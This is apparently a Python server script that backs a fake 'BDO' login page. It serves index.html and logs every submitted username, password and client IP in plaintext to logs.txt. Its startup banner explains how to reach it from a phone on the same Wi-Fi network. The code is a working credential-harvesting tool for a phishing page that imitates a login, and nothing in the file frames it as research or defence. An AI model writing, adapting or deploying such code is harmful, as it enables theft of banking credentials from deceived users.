# server.py - Updated to show IP clearly
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import os
import socket

LOG_FILE = "logs.txt"

class LogHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/log':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                ip = self.client_address[0]
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                log_entry = f"[{timestamp}] | IP: {ip} | Username: {data.get('username', '')} | Password: {data.get('password', '')}\n"
                
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(log_entry)
                
                print(f"✅ LOG SAVED: {log_entry.strip()}")
                
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': True, 
                    'ip': ip, 
                    'timestamp': timestamp
                }).encode())
                
            except Exception as e:
                print(f"❌ Error: {e}")
                self.send_response(500)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            try:
                with open('index.html', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.wfile.write(b"<h1>index.html not found</h1>")
        else:
            self.send_response(404)
            self.end_headers()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Run server on all network interfaces
port = 3000
local_ip = get_local_ip()

print("=" * 60)
print("🚀 BDO LOGIN SERVER RUNNING")
print("=" * 60)
print(f"")
print(f"  📍 ON YOUR COMPUTER:  http://localhost:{port}")
print(f"  📱 ON YOUR PHONE:     http://{local_ip}:{port}")
print(f"")
print(f"  📁 Logs saved to:     {os.path.abspath(LOG_FILE)}")
print(f"")
print("=" * 60)
print("⚠️  IMPORTANT:")
print("  1. Your phone MUST be on the SAME Wi-Fi network")
print("  2. Copy the 'ON YOUR PHONE' URL above into your phone's browser")
print("  3. DO NOT use localhost on your phone - use the IP address")
print("=" * 60)
print("")
print("Press Ctrl+C to stop the server")
print("")

try:
    HTTPServer(("0.0.0.0", port), LogHandler).serve_forever()
except KeyboardInterrupt:
    print("\n👋 Server stopped")